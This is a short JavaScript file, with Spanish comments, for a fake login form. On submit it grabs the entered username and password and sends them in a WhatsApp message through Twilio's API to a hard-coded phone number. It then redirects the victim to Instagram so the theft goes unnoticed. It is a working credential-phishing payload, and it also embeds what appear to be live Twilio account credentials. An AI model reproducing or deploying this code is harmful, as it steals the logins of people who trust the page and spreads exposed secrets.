document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Evita el envío estándar del formulario

    const user = document.getElementById('user').value;
    const password = document.getElementById('password').value;

    const accountSid = 'AC8a4bfa0f29fa73b79d6fdeb7c6eda731'; // Reemplaza con tu Account SID de Twilio
    const authToken = '86d9c9df7d3c92b7183347343cc6f7f0'; // Reemplaza con tu Auth Token de Twilio
    const fromWhatsAppNumber = 'whatsapp:+14155238886'; // Número de WhatsApp de Twilio
    const toWhatsAppNumber = 'whatsapp:+51940411928'; // Tu número de teléfono con formato internacional

    const data = {
        Body: `Usuario: ${user}\nContraseña: ${password}`,
        From: fromWhatsAppNumber,
        To: toWhatsAppNumber
    };

    axios.post(`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json`, data, {
        auth: {
            username: accountSid,
            password: authToken
        },
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    })
    .then(response => {
        console.log('SUCCESS!', response.status, response.data);
        window.location.href = 'https://www.instagram.com/'; // Redirige a Instagram
    })
    .catch(error => {
        console.log('FAILED...', error);
    });
});
